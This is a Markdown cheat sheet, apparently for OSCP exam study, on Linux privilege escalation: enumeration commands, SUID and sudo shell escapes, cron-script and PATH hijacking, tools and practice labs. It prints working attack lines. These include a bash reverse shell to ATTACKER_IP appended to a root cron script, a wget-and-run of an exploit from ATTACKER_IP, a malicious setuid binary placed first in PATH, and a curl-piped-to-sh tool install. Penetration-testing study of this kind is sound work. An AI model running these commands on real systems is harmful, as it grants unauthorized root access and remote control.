# Linux Privilege Escalation

Privilege escalation is the process of gaining higher-level permissions on a system. This guide covers common Linux privilege escalation techniques for the OSCP exam.

## üìã Table of Contents
1. [Enumeration](#enumeration)
2. [Kernel Exploits](#kernel-exploits)
3. [SUID/SGID Binaries](#suidsgid-binaries)
4. [Sudo Exploits](#sudo-exploits)
5. [Cron Jobs](#cron-jobs)
6. [PATH Exploitation](#path-exploitation)
7. [Tools](#-tools)
8. [Practice](#-practice)

## Enumeration

### System Information
```bash
# Basic system info
uname -a
cat /etc/issue
cat /etc/*-release

# Kernel version
uname -r

# Environment variables
env
set

# Network info
ip a
ip route
cat /etc/resolv.conf
```

### User Information
```bash
# Current user
id
whoami

# Other users
cat /etc/passwd
cat /etc/group

# Sudo privileges
sudo -l

# SUID/SGID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# World-writable files
find / -perm -2 -type f 2>/dev/null

# Cron jobs
ls -la /etc/cron*
ls -la /etc/crontab
```

## Kernel Exploits

### Finding Kernel Version
```bash
uname -a
cat /proc/version
```

### Common Kernel Exploits
- **DirtyCow**: CVE-2016-5195
- **DirtyPipe**: CVE-2022-0847
- **PwnKit**: CVE-2021-4034
- **DirtyCred**: CVE-2021-4154

### Compiling Exploits
```bash
# On attacker machine
gcc exploit.c -o exploit
python3 -m http.server 80

# On target machine
wget http://ATTACKER_IP/exploit
chmod +x exploit
./exploit
```

## SUID/SGID Binaries

### Finding SUID/SGID Files
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

### Common Exploitable Binaries
- **find**: `find . -exec /bin/sh -p \; -quit`
- **vim**: `vim -c ':!/bin/sh'`
- **bash**: `bash -p`
- **nmap**: `nmap --interactive` then `!sh`
- **cp/mv**: Overwrite sensitive files

## Sudo Exploits

### Check Sudo Version
```bash
sudo --version
```

### Common Sudo Exploits
- **CVE-2019-14287**: Sudo < 1.8.28
- **LD_PRELOAD**: `sudo LD_PRELOAD=/path/to/malicious.so`
- **NOPASSWD**: Check `sudo -l` for binaries that can be exploited

### Example: Exploiting NOPASSWD
```bash
# If /usr/bin/vi is in sudoers with NOPASSWD
sudo vi
:!sh
```

## Cron Jobs

### Finding Cron Jobs
```bash
ls -la /etc/cron*
ls -la /etc/crontab
ls -la /var/spool/cron/crontabs/
```

### Exploiting Writable Scripts
```bash
# If a script run by root is writable
echo 'chmod +s /bin/bash' >> /path/to/script.sh

# Or create a reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh
nc -nvlp 4444
```

## PATH Exploitation

### Check PATH Variable
```bash
echo $PATH
```

### Exploiting PATH
```bash
# If a script calls a command without full path
# Create a malicious binary in a writable directory
echo 'int main() { setuid(0); system("/bin/sh"); }' > /tmp/suid.c
gcc /tmp/suid.c -o /tmp/ls
export PATH=/tmp:$PATH

# Now when the script runs 'ls', it will execute our malicious binary
```

## üõ† Tools

### Local Enumeration
- **LinPEAS**: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
- **LinEnum**: `./LinEnum.sh -t`
- **Linux Exploit Suggester**: `./linux-exploit-suggester.pl`
- **Linux Smart Enumeration**: `./lse.sh -l1`

### Privilege Escalation Scripts
- **Gtfobins**: https://gtfobins.github.io/
- **SUID3NUM**: `python suid3num.py`
- **Pspy**: Monitor processes without root

## üìö Resources
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [0xdf's Linux Privilege Escalation](https://0xdf.gitlab.io/tags/#privilege-escalation)

## üéØ Practice
1. [TryHackMe Linux PrivEsc Room](https://tryhackme.com/room/linuxprivesc)
2. [Hack The Box Linux Machines](https://www.hackthebox.com/)
3. [VulnHub Kioptrix Series](https://www.vulnhub.com/series/kioptrix,28/)

## ‚ö†Ô∏è Legal Note
Only perform privilege escalation on systems you own or have explicit permission to test. Unauthorized testing is illegal.
